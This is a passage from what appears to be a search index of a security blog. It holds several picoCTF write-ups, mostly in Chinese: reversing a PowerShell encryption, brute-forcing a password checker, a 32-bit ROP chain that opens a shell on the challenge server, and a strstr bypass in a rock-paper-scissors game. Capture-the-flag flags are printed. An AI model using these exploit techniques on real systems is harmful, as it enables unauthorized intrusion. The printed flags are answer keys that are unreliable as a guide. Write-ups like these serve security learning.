{100001, 001100, 001100, 001100...} 35 {100001, 001100, 001100, 001100...} 34 {100001, 001100, 001100, 001100...} 33 {110011, 100011, 110011, 110011...} 32 {100001, 001100, 001100, 001100...} 31 {110011, 100011, 110011, 110011...} 30 {110011, 100011, 110011, 110011...} 29 {110011, 100011, 110011, 110011...} 28 {110011, 100011, 110011, 110011...} 27 {100001, 001100, 001100, 001100...} 26 {110011, 100011, 110011, 110011...} 25 {110011, 100011, 110011, 110011...} 24 {100001, 001100, 001100, 001100...} 23 {110011, 100011, 110011, 110011...} 22 {110011, 100011, 110011, 110011...} 21 {100001, 001100, 001100, 001100...} 20 {100001, 001100, 001100, 001100...} 19 {100001, 001100, 001100, 001100...} 18 {110011, 100011, 110011, 110011...} 17 {110011, 100011, 110011, 110011...} 16 {100001, 001100, 001100, 001100...} 15 {110011, 100011, 110011, 110011...} 14 {100001, 001100, 001100, 001100...} 13 {100001, 001100, 001100, 001100...} 12 {110011, 100011, 110011, 110011...} 11 {100001, 001100, 001100, 001100...} 10 {110011, 100011, 110011, 110011...} 9 {110011, 100011, 110011, 110011...} 8 {100001, 001100, 001100, 001100...} 7 {100001, 001100, 001100, 001100...} 6 {100001, 001100, 001100, 001100...} 5 {100001, 001100, 001100, 001100...} 4 {100001, 001100, 001100, 001100...} 3 {110011, 100011, 110011, 110011...} 2 {110011, 100011, 110011, 110011...} 1 {110011, 100011, 110011, 110011...} 0 {100001, 001100, 001100, 001100...} :::\n$blocks = @{} for ($i=0; $i -lt $out.Length ; $i++) { $r = $out[$i].Split(\u0026#34; \u0026#34;) if ($i -gt 0) { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output \u0026#34;Wrong Format 6\u0026#34; $r[$j].Length Exit } $blocks[$j] += $r[$j] } } else { for ($j=0; $j -lt $r.Length ; $j++) { if ($r[$j].Length -ne 6) { Write-Output \u0026#34;Wrong Format 6\u0026#34; $r[$j].Length Exit } $blocks[$j] = @() $blocks[$j] += $r[$j] } } } Note: $out.Length在只有一列的情況下會return那一列的字元數，但如果列的數量大於一，就會return列的數量，例如：假設input.txt目前有三列，則$out==3，但如果現在只有一列，而此列上寫了10個字元，則$out==10\nBefore Encryption 在執行加密之前，他會運算seeds和random number以便後續的運算\nfor ($i=1; $i -lt ($blocks.count +1); $i++) { $seeds += ($i * 127) % 500 } function Random-Gen { $list1 = @() for ($i=1; $i -lt ($blocks.count + 1); $i++) { $y = ((($i * 327) % 681 ) + 344) % 313 $list1 += $y } return $list1 } Encryption 實際加密的步驟是：計算$fun，他先create一個list，然後先存'10\u0026rsquo;*$raw.Length，然後用$seed計算index(隨機的)，如果$raw[$index]是1，那就改成11，相反，如果是0，就改成00。接著他會和$result以及$randoms[$i]做xor，就得到最後的ciphertext\nDecryption\n我們的目標是要還原出一開始input file中的內容，這樣我們才知道最後的flag的形式長怎麼，所以做法就是逆著做回去，先算出$fun是多少，一開始的$result是0，所以我們可以直接再做xor，就得到$fun， fun = int(output[i].strip()) ^ result ^ randoms[i] Note: $seeds和$randoms可以直接用他給的code section用PS跑看看再存成檔案，也可以直接用python實作，答案會是一樣的 接著，因為他原本是存成binary的形式，所以轉成binary之後要把他split成兩兩一組，再進行之前說的1$\\iff$11和0$\\iff$00轉換，也就是先計算前面提到的random index by (j * seeds[i]) % len(tmpFlagSplit)，再看對應的array是00還是11 for j in range(len(tmpFlagSplit)): y = (j * seeds[i]) % len(tmpFlagSplit) if tmpFlagSplit[y] == \u0026#39;x\u0026#39;: while(tmpFlagSplit[y] == \u0026#39;x\u0026#39;): y = (y + 1) % len(tmpFlagSplit) if tmpFlagSplit[y] == \u0026#39;00\u0026#39;: finalFlag += \u0026#34;0\u0026#34; tmpFlagSplit[y] = \u0026#39;x\u0026#39; elif tmpFlagSplit[y] == \u0026#39;11\u0026#39;: finalFlag += \u0026#34;1\u0026#34; tmpFlagSplit[y] = \u0026#39;x\u0026#39; 前面提到他是一個擁有五個列as content的file，然後每一列都會每六個字元用空格隔開的形式，因此我們也要把結果變成這樣才對。 finalFlagArr = [[], [], [], [], []] for i in range(len(finalFlag)): finalFlagArr[i % 5].append(finalFlag[i]) Find Flag 透過上述的形式，我們已經把input.txt還原出來了，仔細觀察會發現每一個row，都只有包含兩種字串，舉例：第一個row就只包含100001和110011而已，而第二個row則只有包含001100和100011，寫CTF也這麼久了，直覺就是一個binary encoding，試著把100001當成0，另外一個當成1，再傳換成utf-8應該就會產生flag了\nExploit # output = open(\u0026#39;./PicoCTF/Reverse/Powershelly/output.txt\u0026#39;, \u0026#39;r\u0026#39;).readlines() finalFlag = [] tmpFlagSplit = [] randoms = [45, 59, 18, 32, 304, 5, 277, 291, 250, 264, 223, 237, 196, 210, 169, 183, 142, 156, 115, 129, 88, 102, 61, 75, 34, 48, 62, 21, 35, 307, 8, 280, 294, 253, 267, 226, 240, 199, 213, 172, 186, 145, 159, 118, 132, 91, 105, 64, 78, 37, 51, 65, 24, 38, 310, 11, 283, 297, 256, 270, 229, 243, 202, 216, 175, 189, 148, 162, 121, 135, 94, 108, 67, 81, 40, 54, 68, 27, 41, 0, 14, 286, 300, 259, 273, 232, 246, 205, 219, 178, 192, 151, 165, 124, 138, 97, 111, 70, 84, 43, 57, 71, 30, 44, 3, 17, 289, 303, 262, 276, 235, 249, 208, 222, 181, 195, 154, 168, 127, 141, 100, 114, 73, 87, 46, 60, 74, 33, 47, 6, 20, 292, 306, 265, 279, 238, 252, 211, 225, 184, 198, 157, 171, 130, 144, 103, 117, 76, 90, 49, 63, 77, 36, 50, 9, 23, 295, 309, 268, 282, 241, 255, 214, 228, 187, 201, 160, 174, 133, 147, 106, 120, 79, 93, 52, 66, 80, 39, 53, 12, 26, 298, 312, 271, 285, 244, 258, 217, 231, 190, 204, 163, 177, 136, 150, 109, 123, 82, 96, 55, 69, 83, 42, 56, 15, 29, 301, 2, 274, 288, 247, 261, 220, 234, 193, 207, 166, 180, 139, 153, 112, 126, 85, 99, 58, 72, 31, 45, 59, 18, 32, 304, 5, 277, 291, 250, 264, 223, 237, 196, 210, 169, 183, 142, 156, 115, 129, 88, 102, 61, 75, 34, 48, 62, 21, 35, 307, 8, 280, 294, 253, 267, 226, 240] seeds = [127, 254, 381, 8, 135, 262, 389, 16, 143, 270, 397, 24, 151, 278, 405, 32, 159, 286, 413, 40, 167, 294, 421, 48, 175, 302, 429, 56, 183, 310, 437, 64, 191, 318, 445, 72, 199, 326, 453, 80, 207, 334, 461, 88, 215, 342, 469, 96, 223, 350, 477, 104, 231, 358, 485, 112, 239, 366, 493, 120, 247, 374, 1, 128, 255, 382, 9, 136, 263, 390, 17, 144, 271, 398, 25, 152, 279, 406, 33, 160, 287, 414, 41, 168, 295, 422, 49, 176, 303, 430, 57, 184, 311, 438, 65, 192, 319, 446, 73, 200, 327, 454, 81, 208, 335, 462, 89, 216, 343, 470, 97, 224, 351, 478, 105, 232, 359, 486, 113, 240, 367, 494, 121, 248, 375, 2, 129, 256, 383, 10, 137, 264, 391, 18, 145, 272, 399, 26, 153, 280, 407, 34, 161, 288, 415, 42, 169, 296, 423, 50, 177, 304, 431, 58, 185, 312, 439, 66, 193, 320, 447, 74, 201, 328, 455, 82, 209, 336, 463, 90, 217, 344, 471, 98, 225, 352, 479, 106, 233, 360, 487, 114, 241, 368, 495, 122, 249, 376, 3, 130, 257, 384, 11, 138, 265, 392, 19, 146, 273, 400, 27, 154, 281, 408, 35, 162, 289, 416, 43, 170, 297, 424, 51, 178, 305, 432, 59, 186, 313, 440, 67, 194, 321, 448, 75, 202, 329, 456, 83, 210, 337, 464, 91, 218, 345, 472, 99, 226, 353, 480, 107, 234, 361, 488, 115, 242, 369, 496, 123, 250, 377, 4, 131, 258, 385, 12, 139, 266, 393, 20, 147, 274, 401, 28] result = 0 for i in range(len(output)): fun = int(output[i].strip()) ^ result ^ randoms[i] result = int(output[i].strip()) tmp = bin(fun)[2:] tmpFlagSplit = [tmp[i:i+2] for i in range(0, len(tmp), 2)] assert len(tmpFlagSplit) == 30 for j in range(len(tmpFlagSplit)): y = (j * seeds[i]) % len(tmpFlagSplit) if tmpFlagSplit[y] == \u0026#39;x\u0026#39;: while(tmpFlagSplit[y] == \u0026#39;x\u0026#39;): y = (y + 1) % len(tmpFlagSplit) if tmpFlagSplit[y] == \u0026#39;00\u0026#39;: finalFlag += \u0026#34;0\u0026#34; tmpFlagSplit[y] = \u0026#39;x\u0026#39; elif tmpFlagSplit[y] == \u0026#39;11\u0026#39;: finalFlag += \u0026#34;1\u0026#34; tmpFlagSplit[y] = \u0026#39;x\u0026#39; finalFlag = \u0026#34;\u0026#34;.join(finalFlag) finalFlag = [finalFlag[i:i+6] for i in range(0, len(finalFlag), 6)] print(finalFlag) finalFlagArr = [[], [], [], [], []] for i in range(len(finalFlag)): finalFlagArr[i % 5].append(finalFlag[i]) for i in range(len(finalFlagArr)): tmp_arr = set(finalFlagArr[i]) tmp_arr_single_row = \u0026#34; \u0026#34;.join(finalFlagArr[i]) bit = \u0026#34;0\u0026#34; for j in tmp_arr: tmp_arr_single_row = tmp_arr_single_row.replace(j, bit) bit = \u0026#39;1\u0026#39; finalFlagArr[i] = tmp_arr_single_row.replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;) print(bytes.fromhex(hex(int(finalFlagArr[0], 2))[2:]).decode(\u0026#39;cp437\u0026#39;)) Flag: picoCTF{2018highw@y_2_pow3r$hel!}\nReference # Powershelly [180 Points] - 101 Solves\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":304,"href":"/security/practice/picoctf/general-skills/picoctf---pw-crack-4/","title":"PicoCTF - PW Crack 4","section":"Securities","content":" PicoCTF - PW Crack 4 # tags: PicoCTF CTF General Skills # Challenge: PW Crack 4\nSource code # :::spoiler source code\nimport hashlib ### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ######################## def str_xor(secret, key): #extend key to secret length new_key = key i = 0 while len(new_key) \u0026lt; len(secret): new_key = new_key + key[i] i = (i + 1) % len(key) return \u0026#34;\u0026#34;.join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)]) ############################################################################### flag_enc = open(\u0026#39;level4.flag.txt.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() correct_pw_hash = open(\u0026#39;level4.hash.bin\u0026#39;, \u0026#39;rb\u0026#39;).read() def hash_pw(pw_str): pw_bytes = bytearray() pw_bytes.extend(pw_str.encode()) m = hashlib.md5() m.update(pw_bytes) return m.digest() def level_4_pw_check(): user_pw = input(\u0026#34;Please enter correct password for flag: \u0026#34;) user_pw_hash = hash_pw(user_pw) if( user_pw_hash == correct_pw_hash ): print(\u0026#34;Welcome back... your flag, user:\u0026#34;) decryption = str_xor(flag_enc.decode(), user_pw) print(decryption) return print(\u0026#34;That password is incorrect\u0026#34;) level_4_pw_check() # The strings below are 100 possibilities for the correct password. # (Only 1 is correct) pos_pw_list = [\u0026#34;6288\u0026#34;, \u0026#34;6152\u0026#34;, \u0026#34;4c7a\u0026#34;, \u0026#34;b722\u0026#34;, \u0026#34;9a6e\u0026#34;, \u0026#34;6717\u0026#34;, \u0026#34;4389\u0026#34;, \u0026#34;1a28\u0026#34;, \u0026#34;37ac\u0026#34;, \u0026#34;de4f\u0026#34;, \u0026#34;eb28\u0026#34;, \u0026#34;351b\u0026#34;, \u0026#34;3d58\u0026#34;, \u0026#34;948b\u0026#34;, \u0026#34;231b\u0026#34;, \u0026#34;973a\u0026#34;, \u0026#34;a087\u0026#34;, \u0026#34;384a\u0026#34;, \u0026#34;6d3c\u0026#34;, \u0026#34;9065\u0026#34;, \u0026#34;725c\u0026#34;, \u0026#34;fd60\u0026#34;, \u0026#34;4d4f\u0026#34;, \u0026#34;6a60\u0026#34;, \u0026#34;7213\u0026#34;, \u0026#34;93e6\u0026#34;, \u0026#34;8c54\u0026#34;, \u0026#34;537d\u0026#34;, \u0026#34;a1da\u0026#34;, \u0026#34;c718\u0026#34;, \u0026#34;9de8\u0026#34;, \u0026#34;ebe3\u0026#34;, \u0026#34;f1c5\u0026#34;, \u0026#34;a0bf\u0026#34;, \u0026#34;ccab\u0026#34;, \u0026#34;4938\u0026#34;, \u0026#34;8f97\u0026#34;, \u0026#34;3327\u0026#34;, \u0026#34;8029\u0026#34;, \u0026#34;41f2\u0026#34;, \u0026#34;a04f\u0026#34;, \u0026#34;c7f9\u0026#34;, \u0026#34;b453\u0026#34;, \u0026#34;90a5\u0026#34;, \u0026#34;25dc\u0026#34;, \u0026#34;26b0\u0026#34;, \u0026#34;cb42\u0026#34;, \u0026#34;de89\u0026#34;, \u0026#34;2451\u0026#34;, \u0026#34;1dd3\u0026#34;, \u0026#34;7f2c\u0026#34;, \u0026#34;8919\u0026#34;, \u0026#34;f3a9\u0026#34;, \u0026#34;b88f\u0026#34;, \u0026#34;eaa8\u0026#34;, \u0026#34;776a\u0026#34;, \u0026#34;6236\u0026#34;, \u0026#34;98f5\u0026#34;, \u0026#34;492b\u0026#34;, \u0026#34;507d\u0026#34;, \u0026#34;18e8\u0026#34;, \u0026#34;cfb5\u0026#34;, \u0026#34;76fd\u0026#34;, \u0026#34;6017\u0026#34;, \u0026#34;30de\u0026#34;, \u0026#34;bbae\u0026#34;, \u0026#34;354e\u0026#34;, \u0026#34;4013\u0026#34;, \u0026#34;3153\u0026#34;, \u0026#34;e9cc\u0026#34;, \u0026#34;cba9\u0026#34;, \u0026#34;25ea\u0026#34;, \u0026#34;c06c\u0026#34;, \u0026#34;a166\u0026#34;, \u0026#34;faf1\u0026#34;, \u0026#34;2264\u0026#34;, \u0026#34;2179\u0026#34;, \u0026#34;cf30\u0026#34;, \u0026#34;4b47\u0026#34;, \u0026#34;3446\u0026#34;, \u0026#34;b213\u0026#34;, \u0026#34;88a3\u0026#34;, \u0026#34;6253\u0026#34;, \u0026#34;db88\u0026#34;, \u0026#34;c38c\u0026#34;, \u0026#34;a48c\u0026#34;, \u0026#34;3e4f\u0026#34;, \u0026#34;7208\u0026#34;, \u0026#34;9dcb\u0026#34;, \u0026#34;fc77\u0026#34;, \u0026#34;e2cf\u0026#34;, \u0026#34;8552\u0026#34;, \u0026#34;f6f8\u0026#34;, \u0026#34;7079\u0026#34;, \u0026#34;42ef\u0026#34;, \u0026#34;391e\u0026#34;, \u0026#34;8a6d\u0026#34;, \u0026#34;2154\u0026#34;, \u0026#34;d964\u0026#34;, \u0026#34;49ec\u0026#34;] :::\nExploit - Brute Force # import subprocess from subprocess import Popen as p pos_pw_list = [\u0026#34;6288\u0026#34;, \u0026#34;6152\u0026#34;, \u0026#34;4c7a\u0026#34;, \u0026#34;b722\u0026#34;, \u0026#34;9a6e\u0026#34;, \u0026#34;6717\u0026#34;, \u0026#34;4389\u0026#34;, \u0026#34;1a28\u0026#34;, \u0026#34;37ac\u0026#34;, \u0026#34;de4f\u0026#34;, \u0026#34;eb28\u0026#34;, \u0026#34;351b\u0026#34;, \u0026#34;3d58\u0026#34;, \u0026#34;948b\u0026#34;, \u0026#34;231b\u0026#34;, \u0026#34;973a\u0026#34;, \u0026#34;a087\u0026#34;, \u0026#34;384a\u0026#34;, \u0026#34;6d3c\u0026#34;, \u0026#34;9065\u0026#34;, \u0026#34;725c\u0026#34;, \u0026#34;fd60\u0026#34;, \u0026#34;4d4f\u0026#34;, \u0026#34;6a60\u0026#34;, \u0026#34;7213\u0026#34;, \u0026#34;93e6\u0026#34;, \u0026#34;8c54\u0026#34;, \u0026#34;537d\u0026#34;, \u0026#34;a1da\u0026#34;, \u0026#34;c718\u0026#34;, \u0026#34;9de8\u0026#34;, \u0026#34;ebe3\u0026#34;, \u0026#34;f1c5\u0026#34;, \u0026#34;a0bf\u0026#34;, \u0026#34;ccab\u0026#34;, \u0026#34;4938\u0026#34;, \u0026#34;8f97\u0026#34;, \u0026#34;3327\u0026#34;, \u0026#34;8029\u0026#34;, \u0026#34;41f2\u0026#34;, \u0026#34;a04f\u0026#34;, \u0026#34;c7f9\u0026#34;, \u0026#34;b453\u0026#34;, \u0026#34;90a5\u0026#34;, \u0026#34;25dc\u0026#34;, \u0026#34;26b0\u0026#34;, \u0026#34;cb42\u0026#34;, \u0026#34;de89\u0026#34;, \u0026#34;2451\u0026#34;, \u0026#34;1dd3\u0026#34;, \u0026#34;7f2c\u0026#34;, \u0026#34;8919\u0026#34;, \u0026#34;f3a9\u0026#34;, \u0026#34;b88f\u0026#34;, \u0026#34;eaa8\u0026#34;, \u0026#34;776a\u0026#34;, \u0026#34;6236\u0026#34;, \u0026#34;98f5\u0026#34;, \u0026#34;492b\u0026#34;, \u0026#34;507d\u0026#34;, \u0026#34;18e8\u0026#34;, \u0026#34;cfb5\u0026#34;, \u0026#34;76fd\u0026#34;, \u0026#34;6017\u0026#34;, \u0026#34;30de\u0026#34;, \u0026#34;bbae\u0026#34;, \u0026#34;354e\u0026#34;, \u0026#34;4013\u0026#34;, \u0026#34;3153\u0026#34;, \u0026#34;e9cc\u0026#34;, \u0026#34;cba9\u0026#34;, \u0026#34;25ea\u0026#34;, \u0026#34;c06c\u0026#34;, \u0026#34;a166\u0026#34;, \u0026#34;faf1\u0026#34;, \u0026#34;2264\u0026#34;, \u0026#34;2179\u0026#34;, \u0026#34;cf30\u0026#34;, \u0026#34;4b47\u0026#34;, \u0026#34;3446\u0026#34;, \u0026#34;b213\u0026#34;, \u0026#34;88a3\u0026#34;, \u0026#34;6253\u0026#34;, \u0026#34;db88\u0026#34;, \u0026#34;c38c\u0026#34;, \u0026#34;a48c\u0026#34;, \u0026#34;3e4f\u0026#34;, \u0026#34;7208\u0026#34;, \u0026#34;9dcb\u0026#34;, \u0026#34;fc77\u0026#34;, \u0026#34;e2cf\u0026#34;, \u0026#34;8552\u0026#34;, \u0026#34;f6f8\u0026#34;, \u0026#34;7079\u0026#34;, \u0026#34;42ef\u0026#34;, \u0026#34;391e\u0026#34;, \u0026#34;8a6d\u0026#34;, \u0026#34;2154\u0026#34;, \u0026#34;d964\u0026#34;, \u0026#34;49ec\u0026#34;] for i in range(len(pos_pw_list)): echo_str = p([\u0026#34;echo\u0026#34;, pos_pw_list[i] + \u0026#39;\\n\u0026#39;], stdout=subprocess.PIPE, text=True) return_str = p([\u0026#34;python\u0026#34;, \u0026#34;level4.py\u0026#34;], stdin=echo_str.stdout, stdout=subprocess.PIPE, text=True) output, error = return_str.communicate() if \u0026#34;That password is incorrect\u0026#34; not in output: print(pos_pw_list[i]) "},{"id":305,"href":"/security/practice/picoctf/pwn/picoctf---ropfu/","title":"PicoCTF - ropfu","section":"Securities","content":" PicoCTF - ropfu # Background # ROP Chain x86 Calling Convention: Linux System Call Table\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define BUFSIZE 16 void vuln() { char buf[16]; printf(\u0026#34;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\\n\u0026#34;); return gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); } :::\nRecon # $ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=232215a502491a549a155b1a790de97f0c433482, for GNU/Linux 3.2.0, not stripped $ checksec vuln [*] \u0026#39;/mnt/d/NTU/CTF/PicoCTF/PWN/ropfu/vuln\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 這一題很明顯要開個shell，我以為會像12這兩題一樣，事實上概念完全一樣，但換到x86的32bits版本就不知道為啥一直沒有成功，後來有想到是忽略了calling convention的問題，和x86-64的版本不一樣，另外指令的選擇上也不太一樣，像64bits的system call會用syscall，但x86會用int 0x80處理3，另外寫入/bin/sh\\x00的方式也和之前的不一樣，之前是call __libc_read function之前把暫存器的部分擺好，就直接跳到__libc_read的地方去，但在這邊是沒辦法成功的，看了其他人的wp4，大部分的做法都是直接用rop把值寫到對應的section中，詳細如下:\npop edx -\u0026gt; bss address pop eax -\u0026gt; 0x6e69622f -\u0026gt; /bin mov DWORD PTR [edx] eax pop edx -\u0026gt; bss address pop eax -\u0026gt; 0x0068732f -\u0026gt; /sh\\x00 mov DWORD PTR [edx] eax 寫完/bin/sh\\x00就直接call execve的syscall開shell\nExploit - ROP Chain # from pwn import * # r = process(\u0026#39;./vuln\u0026#39;) r= remote(\u0026#39;saturn.picoctf.net\u0026#39;, 54107) context.arch = \u0026#39;amd64\u0026#39; r.recvline() pop_eax_ret = 0x80b073a pop_edx_ebx_ret = 0x80583b9 bss_addr = 0x080e5050 mov_dword_ptr_edx_eax_ret = 0x80590f2 pop_ecx_ret = 0x8049e29 int_0x80 = 0x0807163f \u0026#39;\u0026#39;\u0026#39;############ Read /bin/sh\\x00 ############\u0026#39;\u0026#39;\u0026#39; # raw_input() r.sendline(b\u0026#39;a\u0026#39; * 0x1c + p32(pop_edx_ebx_ret) + p32(bss_addr) + p32(0) + p32(pop_eax_ret) + p32(0x6e69622f) + p32(mov_dword_ptr_edx_eax_ret) + p32(pop_edx_ebx_ret) + p32(bss_addr + 4) + p32(0) + p32(pop_eax_ret) + p32(0x0068732f) + p32(mov_dword_ptr_edx_eax_ret) + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ebx_ret) + p32(0) + p32(bss_addr) + p32(pop_ecx_ret) + p32(0) + p32(int_0x80) ) r.interactive() Flag: picoCTF{5n47ch_7h3_5h311_1b5a4b40}\nReference # PicoCTF - Guessing Game 1\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSimple PWN - 0x12(Lab - rop++)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n在 Linux 下寫組語, 透過 int 0x80 使用 system call \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nPicoCTF 2022: Beginner\u0026rsquo;s Compilation \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":306,"href":"/security/practice/picoctf/pwn/picoctf---rps/","title":"PicoCTF - RPS","section":"Securities","content":" PicoCTF - RPS # Background # strstr() in C/C++\nIn C++, std::strstr() is a predefined function used for string handling. string.h is the header file required for string functions. This function takes two strings s1 and s2 as an argument and finds the first occurrence of the sub-string s2 in the string s1. The process of matching does not include the terminating null-characters(‘\\0’), but function stops there. Syntax:\nchar *strstr (const char *s1, const char *s2); Parameters: s1: This is the main string to be examined. s2: This is the sub-string to be searched in s1 string. Return Value: This function returns a pointer points to the first character of the found s2 in s1 otherwise a null pointer if s2 is not present in s1. If s2 points to an empty string, s1 is returned.\nSource code # :::spoiler Source Code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define WAIT 60 static const char* flag = \u0026#34;[REDACTED]\u0026#34;; char* hands[3] = {\u0026#34;rock\u0026#34;, \u0026#34;paper\u0026#34;, \u0026#34;scissors\u0026#34;}; char* loses[3] = {\u0026#34;paper\u0026#34;, \u0026#34;scissors\u0026#34;, \u0026#34;rock\u0026#34;}; int wins = 0; int tgetinput(char *input, unsigned int l) { fd_set input_set; struct timeval timeout; int ready_for_reading = 0; int read_bytes = 0; if( l \u0026lt;= 0 ) { printf(\u0026#34;\u0026#39;l\u0026#39; for tgetinput must be greater than 0\\n\u0026#34;); return -2; } /* Empty the FD Set */ FD_ZERO(\u0026amp;input_set ); /* Listen to the input descriptor */ FD_SET(STDIN_FILENO, \u0026amp;input_set); /* Waiting for some seconds */ timeout.tv_sec = WAIT; // WAIT seconds timeout.tv_usec = 0; // 0 milliseconds /* Listening for input stream for any activity */ ready_for_reading = select(1, \u0026amp;input_set, NULL, NULL, \u0026amp;timeout); /* Here, first parameter is number of FDs in the set, * second is our FD set for reading, * third is the FD set in which any write activity needs to updated, * which is not required in this case. * Fourth is timeout */ if (ready_for_reading == -1) { /* Some error has occured in input */ printf(\u0026#34;Unable to read your input\\n\u0026#34;); return -1; } if (ready_for_reading) { read_bytes = read(0, input, l-1); if(input[read_bytes-1]==\u0026#39;\\n\u0026#39;){ --read_bytes; input[read_bytes]=\u0026#39;\\0\u0026#39;; } if(read_bytes==0){ printf(\u0026#34;No data given.\\n\u0026#34;); return -4; } else { return 0; } } else { printf(\u0026#34;Timed out waiting for user input. Press Ctrl-C to disconnect\\n\u0026#34;); return -3; } return 0; } bool play () { char player_turn[100]; srand(time(0)); int r; printf(\u0026#34;Please make your selection (rock/paper/scissors):\\n\u0026#34;); r = tgetinput(player_turn, 100); // Timeout on user input if(r == -3) { printf(\u0026#34;Goodbye!\\n\u0026#34;); exit(0); } int computer_turn = rand() % 3; printf(\u0026#34;You played: %s\\n\u0026#34;, player_turn); printf(\u0026#34;The computer played: %s\\n\u0026#34;, hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) { puts(\u0026#34;You win! Play again?\u0026#34;); return true; } else { puts(\u0026#34;Seems like you didn\u0026#39;t win this time. Play again?\u0026#34;); return false; } } int main () { char input[3] = {\u0026#39;\\0\u0026#39;}; int command; int r; puts(\u0026#34;Welcome challenger to the game of Rock, Paper, Scissors\u0026#34;); puts(\u0026#34;For anyone that beats me 5 times in a row, I will offer up a flag I found\u0026#34;); puts(\u0026#34;Are you ready?\u0026#34;); while (true) { puts(\u0026#34;Type \u0026#39;1\u0026#39; to play a game\u0026#34;); puts(\u0026#34;Type \u0026#39;2\u0026#39; to exit the program\u0026#34;); r = tgetinput(input, 3); // Timeout on user input if(r == -3) { printf(\u0026#34;Goodbye!\\n\u0026#34;); exit(0); } if ((command = strtol(input, NULL, 10)) == 0) { puts(\u0026#34;Please put in a valid number\u0026#34;); } else if (command == 1) { printf(\u0026#34;\\n\\n\u0026#34;); if (play()) { wins++; } else { wins = 0; } if (wins \u0026gt;= 5) { puts(\u0026#34;Congrats, here\u0026#39;s the flag!\u0026#34;); puts(flag); } } else if (command == 2) { return 0; } else { puts(\u0026#34;Please type either 1 or 2\u0026#34;); } } return 0; } :::\nRecon # 這一題有reverse的感覺，主要是利用strstr()這個function拿到win++，在第100行的地方是利用strstr()搜索字串達到判斷勝利的功能，但是如果我們把三種結果結合在一起，則這一段結果就一定會試true\nExploit # Payload: paperscissorsrock :::spoiler Whole Progress\n$ nc saturn.picoctf.net 51418 Welcome challenger to the game of Rock, Paper, Scissors For anyone that beats me 5 times in a row, I will offer up a flag I found Are you ready? Type \u0026#39;1\u0026#39; to play a game Type \u0026#39;2\u0026#39; to exit the program 1 1 Please make your selection (rock/paper/scissors): paperscissorsrock paperscissorsrock You played: paperscissorsrock The computer played: scissors You win! Play again? Type \u0026#39;1\u0026#39; to play a game Type \u0026#39;2\u0026#39; to exit the program 1 1 Please make your selection (rock/paper/scissors): paperscissorsrock paperscissorsrock You played: paperscissorsrock The computer played: rock You win! Play again? Type \u0026#39;1\u0026#39; to play a game Type \u0026#39;2\u0026#39; to exit the program 1 1 Please make your selection (rock/paper/scissors): paperscissorsrock paperscissorsrock You played: paperscissorsrock The computer played: scissors You win! Play again? Type \u0026#39;1\u0026#39; to play a game Type \u0026#39;2\u0026#39; to exit the program 1 1 Please make your selection (rock/paper/scissors): paperscissorsrock paperscissorsrock You played: paperscissorsrock The computer played: paper You win! Play again? Type \u0026#39;1\u0026#39; to play a game Type \u0026#39;2\u0026#39; to exit the program 1 1 Please make your selection (rock/paper/scissors): paperscissorsrock paperscissorsrock You played: paperscissorsrock The computer played: rock You win! Play again? Congrats, here\u0026#39;s the flag! picoCTF{50M3_3X7R3M3_1UCK_58F0F41B} Type \u0026#39;1\u0026#39; to play a game Type \u0026#39;2\u0026#39; to exit the program ::: Flag: picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}\nReference # picoCTF 2022: binary-exploitation – RPS\n"},{"id":307,"href":"/security/practice/picoctf/pwn/picoctf---saas/","title":"PicoCTF - SaaS","section":"Securities","content":" PicoCTF - SaaS # Background # seccomp-tool\nSource code # :::spoiler Source Code\n#include \u0026lt;errno.h\u0026gt; #include \u0026lt;error.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;seccomp.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define SIZE 0x100 // http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A\u0026amp;arch=x86-64\u0026amp;as_format=inline#assembly 